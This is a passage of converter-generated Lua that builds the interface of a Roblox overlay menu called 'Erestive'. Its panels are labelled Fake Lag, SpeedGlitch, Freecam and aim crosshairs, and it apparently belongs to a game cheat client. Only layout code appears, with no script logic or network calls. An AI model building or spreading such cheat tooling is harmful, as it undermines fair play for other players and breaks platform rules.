--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 1336 | Scripts: 207 | Modules: 4 | Tags: 0
local G2L = {};

-- StarterGui.Erestive
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["DisplayOrder"] = 999999999;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["Name"] = [[Erestive]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.Erestive.Insert2
G2L["2"] = Instance.new("LocalScript", G2L["1"]);
G2L["2"]["Name"] = [[Insert2]];


-- StarterGui.Erestive.Zoom
G2L["3"] = Instance.new("LocalScript", G2L["1"]);
G2L["3"]["Enabled"] = false;
G2L["3"]["Name"] = [[Zoom]];
G2L["3"]["Disabled"] = true;


-- StarterGui.Erestive.Zoom.Value
G2L["4"] = Instance.new("StringValue", G2L["3"]);
G2L["4"]["Value"] = [[0.3]];


-- StarterGui.Erestive.Zoom.Key
G2L["5"] = Instance.new("StringValue", G2L["3"]);
G2L["5"]["Name"] = [[Key]];
G2L["5"]["Value"] = [[LeftAlt]];


-- StarterGui.Erestive.FreecamScript
G2L["6"] = Instance.new("LocalScript", G2L["1"]);
G2L["6"]["Name"] = [[FreecamScript]];


-- StarterGui.Erestive.Insert1
G2L["7"] = Instance.new("LocalScript", G2L["1"]);
G2L["7"]["Name"] = [[Insert1]];


-- StarterGui.Erestive.CustomShiftLock
G2L["8"] = Instance.new("LocalScript", G2L["1"]);
G2L["8"]["Name"] = [[CustomShiftLock]];


-- StarterGui.Erestive.CustomShiftLock.SmoothShiftLock
G2L["9"] = Instance.new("ModuleScript", G2L["8"]);
G2L["9"]["Name"] = [[SmoothShiftLock]];


-- StarterGui.Erestive.CustomShiftLock.SmoothShiftLock.Utils
G2L["a"] = Instance.new("Folder", G2L["9"]);
G2L["a"]["Name"] = [[Utils]];


-- StarterGui.Erestive.CustomShiftLock.SmoothShiftLock.Utils.Maid
G2L["b"] = Instance.new("ModuleScript", G2L["a"]);
G2L["b"]["Name"] = [[Maid]];


-- StarterGui.Erestive.CustomShiftLock.SmoothShiftLock.Utils.Spring
G2L["c"] = Instance.new("ModuleScript", G2L["a"]);
G2L["c"]["Name"] = [[Spring]];


-- StarterGui.Erestive.CustomShiftLock.SmoothShiftLock.Utils.Signal
G2L["d"] = Instance.new("ModuleScript", G2L["a"]);
G2L["d"]["Name"] = [[Signal]];


-- StarterGui.Erestive.CustomShiftLock.SmoothShiftLock.ToggleShiftLock
G2L["e"] = Instance.new("BindableEvent", G2L["9"]);
G2L["e"]["Name"] = [[ToggleShiftLock]];


-- StarterGui.Erestive.CustomShiftLock.SmoothShiftLock.EditConfig
G2L["f"] = Instance.new("BindableEvent", G2L["9"]);
G2L["f"]["Name"] = [[EditConfig]];


-- StarterGui.Erestive.LocalScript
G2L["10"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.Erestive.SendNotification
G2L["11"] = Instance.new("LocalScript", G2L["1"]);
G2L["11"]["Name"] = [[SendNotification]];


-- StarterGui.Erestive.loading
G2L["12"] = Instance.new("LocalScript", G2L["1"]);
G2L["12"]["Name"] = [[loading]];


-- StarterGui.Erestive.bindsActive
G2L["13"] = Instance.new("Frame", G2L["1"]);
G2L["13"]["Visible"] = false;
G2L["13"]["ZIndex"] = 999999992;
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(3, 5, 10);
G2L["13"]["Size"] = UDim2.new(0, 195, 0, 38);
G2L["13"]["Position"] = UDim2.new(0.68855, 0, 0.0831, 0);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Name"] = [[bindsActive]];
G2L["13"]["BackgroundTransparency"] = 0.15;


-- StarterGui.Erestive.bindsActive.UIDrag
G2L["14"] = Instance.new("LocalScript", G2L["13"]);
G2L["14"]["Name"] = [[UIDrag]];


-- StarterGui.Erestive.bindsActive.UIListLayout
G2L["15"] = Instance.new("UIListLayout", G2L["13"]);
G2L["15"]["Padding"] = UDim.new(0, 5);


-- StarterGui.Erestive.bindsActive.1TextLabel
G2L["16"] = Instance.new("TextLabel", G2L["13"]);
G2L["16"]["TextWrapped"] = true;
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextSize"] = 14;
G2L["16"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["16"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["TextScaled"] = true;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundTransparency"] = 1;
G2L["16"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[Binds Active]];
G2L["16"]["Name"] = [[1TextLabel]];


-- StarterGui.Erestive.bindsActive.ScrollingFrame
G2L["17"] = Instance.new("ScrollingFrame", G2L["13"]);
G2L["17"]["Active"] = true;
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 13);
G2L["17"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["17"]["Size"] = UDim2.new(1, 0, 5.51385, 0);
G2L["17"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Position"] = UDim2.new(0, 0, 1.13158, 0);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Erestive.bindsActive.ScrollingFrame.Sg
G2L["18"] = Instance.new("Frame", G2L["17"]);
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["Size"] = UDim2.new(1, 0, 0.66951, 0);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Name"] = [[Sg]];
G2L["18"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.bindsActive.ScrollingFrame.Sg.1
G2L["19"] = Instance.new("TextLabel", G2L["18"]);
G2L["19"]["TextWrapped"] = true;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["TextSize"] = 54;
G2L["19"]["TextScaled"] = true;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic);
G2L["19"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["BackgroundTransparency"] = 1;
G2L["19"]["Size"] = UDim2.new(1, 0, 0.24169, 0);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Text"] = [[SpeedGlitch]];
G2L["19"]["Name"] = [[1]];
G2L["19"]["Position"] = UDim2.new(0, 0, 0, 0);


-- StarterGui.Erestive.bindsActive.ScrollingFrame.Sg.1.UIStroke
G2L["1a"] = Instance.new("UIStroke", G2L["19"]);
G2L["1a"]["Transparency"] = 0.68;
G2L["1a"]["LineJoinMode"] = Enum.LineJoinMode.Bevel;
G2L["1a"]["Thickness"] = 3;


-- StarterGui.Erestive.bindsActive.ScrollingFrame.Sg.t2
G2L["1b"] = Instance.new("TextLabel", G2L["18"]);
G2L["1b"]["TextWrapped"] = true;
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["TextSize"] = 14;
G2L["1b"]["TextScaled"] = true;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["BackgroundTransparency"] = 1;
G2L["1b"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["1b"]["Visible"] = false;
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Text"] = [[On -]];
G2L["1b"]["Name"] = [[t2]];


-- StarterGui.Erestive.bindsActive.ScrollingFrame.Sg.t2.UIStroke
G2L["1c"] = Instance.new("UIStroke", G2L["1b"]);
G2L["1c"]["Transparency"] = 0.68;
G2L["1c"]["LineJoinMode"] = Enum.LineJoinMode.Bevel;
G2L["1c"]["Thickness"] = 3;


-- StarterGui.Erestive.bindsActive.ScrollingFrame.Sg.t3
G2L["1d"] = Instance.new("TextLabel", G2L["18"]);
G2L["1d"]["TextWrapped"] = true;
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["TextSize"] = 14;
G2L["1d"]["TextScaled"] = true;
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["BackgroundTransparency"] = 1;
G2L["1d"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["1d"]["Visible"] = false;
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Text"] = [[Off -]];
G2L["1d"]["Name"] = [[t3]];


-- StarterGui.Erestive.bindsActive.ScrollingFrame.Sg.t3.UIStroke
G2L["1e"] = Instance.new("UIStroke", G2L["1d"]);
G2L["1e"]["Transparency"] = 0.68;
G2L["1e"]["LineJoinMode"] = Enum.LineJoinMode.Bevel;
G2L["1e"]["Thickness"] = 3;


-- StarterGui.Erestive.bindsActive.ScrollingFrame.Sg.UIListLayout
G2L["1f"] = Instance.new("UIListLayout", G2L["18"]);
G2L["1f"]["Padding"] = UDim.new(0, 5);


-- StarterGui.Erestive.bindsActive.ScrollingFrame.UIStroke
G2L["20"] = Instance.new("UIStroke", G2L["17"]);
G2L["20"]["Transparency"] = 0.6;
G2L["20"]["Thickness"] = 7;
G2L["20"]["Color"] = Color3.fromRGB(33, 36, 40);


-- StarterGui.Erestive.bindsActive.ScrollingFrame.UICorner
G2L["21"] = Instance.new("UICorner", G2L["17"]);
G2L["21"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Erestive.bindsActive.ScrollingFrame.UIListLayout
G2L["22"] = Instance.new("UIListLayout", G2L["17"]);
G2L["22"]["Padding"] = UDim.new(0, 5);


-- StarterGui.Erestive.bindsActive.UIStroke
G2L["23"] = Instance.new("UIStroke", G2L["13"]);
G2L["23"]["Transparency"] = 0.6;
G2L["23"]["Thickness"] = 7;
G2L["23"]["Color"] = Color3.fromRGB(33, 36, 40);


-- StarterGui.Erestive.bindsActive.UICorner
G2L["24"] = Instance.new("UICorner", G2L["13"]);
G2L["24"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Erestive.FakeLag
G2L["25"] = Instance.new("Frame", G2L["1"]);
G2L["25"]["Visible"] = false;
G2L["25"]["ZIndex"] = 999999992;
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(3, 5, 10);
G2L["25"]["Size"] = UDim2.new(0, 195, 0, 244);
G2L["25"]["Position"] = UDim2.new(0.68855, 0, 0.0831, 0);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Name"] = [[FakeLag]];
G2L["25"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Erestive.FakeLag.UIDrag
G2L["26"] = Instance.new("LocalScript", G2L["25"]);
G2L["26"]["Name"] = [[UIDrag]];


-- StarterGui.Erestive.FakeLag.UICorner
G2L["27"] = Instance.new("UICorner", G2L["25"]);



-- StarterGui.Erestive.FakeLag.ImageLabel
G2L["28"] = Instance.new("ImageLabel", G2L["25"]);
G2L["28"]["ZIndex"] = -888;
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["ScaleType"] = Enum.ScaleType.Crop;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["28"]["Image"] = [[rbxassetid://129962492327343]];
G2L["28"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.FakeLag.ImageLabel.UIListLayout
G2L["29"] = Instance.new("UIListLayout", G2L["28"]);



-- StarterGui.Erestive.FakeLag.ImageLabel.UIPadding
G2L["2a"] = Instance.new("UIPadding", G2L["28"]);
G2L["2a"]["PaddingTop"] = UDim.new(0, 5);


-- StarterGui.Erestive.FakeLag.ImageLabel.UICorner
G2L["2b"] = Instance.new("UICorner", G2L["28"]);



-- StarterGui.Erestive.FakeLag.ImageLabel.Falling
G2L["2c"] = Instance.new("TextButton", G2L["28"]);
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["TextTransparency"] = 1;
G2L["2c"]["TextSize"] = 14;
G2L["2c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2c"]["BackgroundTransparency"] = 1;
G2L["2c"]["Size"] = UDim2.new(0, 192, 0, 50);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Name"] = [[Falling]];


-- StarterGui.Erestive.FakeLag.ImageLabel.Falling.LocalScript
G2L["2d"] = Instance.new("LocalScript", G2L["2c"]);



-- StarterGui.Erestive.FakeLag.ImageLabel.Falling.ImageLabel
G2L["2e"] = Instance.new("ImageLabel", G2L["2c"]);
G2L["2e"]["BorderSizePixel"] = 0;
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["2e"]["Image"] = [[rbxassetid://7992557358]];
G2L["2e"]["Size"] = UDim2.new(0.2551, 0, 1, 0);
G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.FakeLag.ImageLabel.Falling.UIPadding
G2L["2f"] = Instance.new("UIPadding", G2L["2c"]);
G2L["2f"]["PaddingRight"] = UDim.new(0.01, 0);
G2L["2f"]["PaddingLeft"] = UDim.new(0.01, 0);


-- StarterGui.Erestive.FakeLag.ImageLabel.Falling.UIListLayout
G2L["30"] = Instance.new("UIListLayout", G2L["2c"]);
G2L["30"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.FakeLag.ImageLabel.Falling.TextLabel
G2L["31"] = Instance.new("TextLabel", G2L["2c"]);
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["TextSize"] = 36;
G2L["31"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["BackgroundTransparency"] = 1;
G2L["31"]["Size"] = UDim2.new(0, 140, 0, 50);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Text"] = [[Falling]];


-- StarterGui.Erestive.FakeLag.ImageLabel.Lag
G2L["32"] = Instance.new("TextButton", G2L["28"]);
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["TextTransparency"] = 1;
G2L["32"]["TextSize"] = 14;
G2L["32"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["32"]["BackgroundTransparency"] = 1;
G2L["32"]["Size"] = UDim2.new(0, 192, 0, 50);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Name"] = [[Lag]];


-- StarterGui.Erestive.FakeLag.ImageLabel.Lag.LocalScript
G2L["33"] = Instance.new("LocalScript", G2L["32"]);



-- StarterGui.Erestive.FakeLag.ImageLabel.Lag.TextLabel
G2L["34"] = Instance.new("TextLabel", G2L["32"]);
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["TextSize"] = 36;
G2L["34"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["34"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["BackgroundTransparency"] = 1;
G2L["34"]["Size"] = UDim2.new(0, 140, 0, 50);
G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["Text"] = [[Fake Lag]];


-- StarterGui.Erestive.FakeLag.ImageLabel.Lag.ImageLabel
G2L["35"] = Instance.new("ImageLabel", G2L["32"]);
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["35"]["Image"] = [[rbxassetid://9905625770]];
G2L["35"]["Size"] = UDim2.new(0.2551, 0, 1, 0);
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.FakeLag.ImageLabel.Lag.UIPadding
G2L["36"] = Instance.new("UIPadding", G2L["32"]);
G2L["36"]["PaddingRight"] = UDim.new(0.01, 0);
G2L["36"]["PaddingLeft"] = UDim.new(0.01, 0);


-- StarterGui.Erestive.FakeLag.ImageLabel.Lag.UIListLayout
G2L["37"] = Instance.new("UIListLayout", G2L["32"]);
G2L["37"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.FakeLag.ImageLabel.Lag.Value
G2L["38"] = Instance.new("BoolValue", G2L["32"]);



-- StarterGui.Erestive.FakeLag.ImageLabel.WaitTime
G2L["39"] = Instance.new("TextBox", G2L["28"]);
G2L["39"]["Name"] = [[WaitTime]];
G2L["39"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["39"]["BorderSizePixel"] = 0;
G2L["39"]["TextWrapped"] = true;
G2L["39"]["TextSize"] = 14;
G2L["39"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["TextScaled"] = true;
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["39"]["PlaceholderText"] = [[Wait Time]];
G2L["39"]["Size"] = UDim2.new(0, 192, 0, 50);
G2L["39"]["Position"] = UDim2.new(0, 0, 0.41841, 0);
G2L["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["Text"] = [[0.05]];
G2L["39"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.FakeLag.ImageLabel.WaitTime.UIStroke
G2L["3a"] = Instance.new("UIStroke", G2L["39"]);
G2L["3a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3a"]["Thickness"] = 2.7;
G2L["3a"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.FakeLag.ImageLabel.WaitTime.UICorner
G2L["3b"] = Instance.new("UICorner", G2L["39"]);



-- StarterGui.Erestive.FakeLag.ImageLabel.DelayTime
G2L["3c"] = Instance.new("TextBox", G2L["28"]);
G2L["3c"]["Name"] = [[DelayTime]];
G2L["3c"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["3c"]["BorderSizePixel"] = 0;
G2L["3c"]["TextWrapped"] = true;
G2L["3c"]["TextSize"] = 14;
G2L["3c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["TextScaled"] = true;
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3c"]["PlaceholderText"] = [[Delay Time]];
G2L["3c"]["Size"] = UDim2.new(0, 192, 0, 50);
G2L["3c"]["Position"] = UDim2.new(0, 0, 0.41841, 0);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["Text"] = [[0.4]];
G2L["3c"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.FakeLag.ImageLabel.DelayTime.UICorner
G2L["3d"] = Instance.new("UICorner", G2L["3c"]);



-- StarterGui.Erestive.FakeLag.ImageLabel.DelayTime.UIStroke
G2L["3e"] = Instance.new("UIStroke", G2L["3c"]);
G2L["3e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3e"]["Thickness"] = 2.7;
G2L["3e"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.FakeLag.UIListLayout
G2L["3f"] = Instance.new("UIListLayout", G2L["25"]);



-- StarterGui.Erestive.aim3
G2L["40"] = Instance.new("TextLabel", G2L["1"]);
G2L["40"]["TextWrapped"] = true;
G2L["40"]["ZIndex"] = 999999999;
G2L["40"]["BorderSizePixel"] = 0;
G2L["40"]["TextSize"] = 27;
G2L["40"]["SelectionOrder"] = -9;
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["40"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["BackgroundTransparency"] = 1;
G2L["40"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["40"]["Visible"] = false;
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["Text"] = [[○]];
G2L["40"]["Name"] = [[aim3]];


-- StarterGui.Erestive.aim2
G2L["41"] = Instance.new("TextLabel", G2L["1"]);
G2L["41"]["TextWrapped"] = true;
G2L["41"]["ZIndex"] = 999999999;
G2L["41"]["BorderSizePixel"] = 0;
G2L["41"]["TextSize"] = 21;
G2L["41"]["SelectionOrder"] = -9;
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["41"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["BackgroundTransparency"] = 1;
G2L["41"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["41"]["Visible"] = false;
G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["Text"] = [[×]];
G2L["41"]["Name"] = [[aim2]];


-- StarterGui.Erestive.aim1
G2L["42"] = Instance.new("TextLabel", G2L["1"]);
G2L["42"]["TextWrapped"] = true;
G2L["42"]["ZIndex"] = 999999999;
G2L["42"]["BorderSizePixel"] = 0;
G2L["42"]["TextSize"] = 27;
G2L["42"]["SelectionOrder"] = -9;
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["42"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["BackgroundTransparency"] = 1;
G2L["42"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["42"]["Visible"] = false;
G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42"]["Text"] = [[+]];
G2L["42"]["Name"] = [[aim1]];


-- StarterGui.Erestive.TopInformation
G2L["43"] = Instance.new("Frame", G2L["1"]);
G2L["43"]["ZIndex"] = 999999992;
G2L["43"]["BorderSizePixel"] = 0;
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["43"]["Name"] = [[TopInformation]];
G2L["43"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.TopInformation.UIListLayout
G2L["44"] = Instance.new("UIListLayout", G2L["43"]);
G2L["44"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Right;
G2L["44"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.TopInformation.UIPadding
G2L["45"] = Instance.new("UIPadding", G2L["43"]);
G2L["45"]["PaddingLeft"] = UDim.new(0, 5);
G2L["45"]["PaddingBottom"] = UDim.new(0, 5);


-- StarterGui.Erestive.TopInformation.4Frame
G2L["46"] = Instance.new("Frame", G2L["43"]);
G2L["46"]["BorderSizePixel"] = 0;
G2L["46"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["Size"] = UDim2.new(0, 126, 0, 28);
G2L["46"]["Position"] = UDim2.new(0.90844, 0, 0, 0);
G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["46"]["Name"] = [[4Frame]];
G2L["46"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.TopInformation.4Frame.TextLabel
G2L["47"] = Instance.new("TextLabel", G2L["46"]);
G2L["47"]["TextWrapped"] = true;
G2L["47"]["TextStrokeTransparency"] = 0.58;
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["TextSize"] = 14;
G2L["47"]["TextScaled"] = true;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["47"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["BackgroundTransparency"] = 1;
G2L["47"]["Size"] = UDim2.new(0, 68, 0, 28);
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Text"] = [[0:00]];
G2L["47"]["Position"] = UDim2.new(0.38492, 0, 0, 0);


-- StarterGui.Erestive.TopInformation.4Frame.TextLabel.LocalScript
G2L["48"] = Instance.new("LocalScript", G2L["47"]);



-- StarterGui.Erestive.TopInformation.4Frame.TextLabel.UIPadding
G2L["49"] = Instance.new("UIPadding", G2L["47"]);
G2L["49"]["PaddingTop"] = UDim.new(0, 2);
G2L["49"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.Erestive.TopInformation.4Frame.UIListLayout
G2L["4a"] = Instance.new("UIListLayout", G2L["46"]);
G2L["4a"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["4a"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["4a"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.TopInformation.4Frame.1Image
G2L["4b"] = Instance.new("ImageLabel", G2L["46"]);
G2L["4b"]["BorderSizePixel"] = 0;
G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4b"]["Image"] = [[rbxassetid://5881109960]];
G2L["4b"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["4b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b"]["BackgroundTransparency"] = 1;
G2L["4b"]["Name"] = [[1Image]];


-- StarterGui.Erestive.TopInformation.4Frame.1Image.UIGradient
G2L["4c"] = Instance.new("UIGradient", G2L["4b"]);
G2L["4c"]["Rotation"] = -147;
G2L["4c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(26, 26, 26)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.TopInformation.3Frame
G2L["4d"] = Instance.new("Frame", G2L["43"]);
G2L["4d"]["BorderSizePixel"] = 0;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["Size"] = UDim2.new(0, 126, 0, 28);
G2L["4d"]["Position"] = UDim2.new(0.90844, 0, 0, 0);
G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Name"] = [[3Frame]];
G2L["4d"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.TopInformation.3Frame.UIListLayout
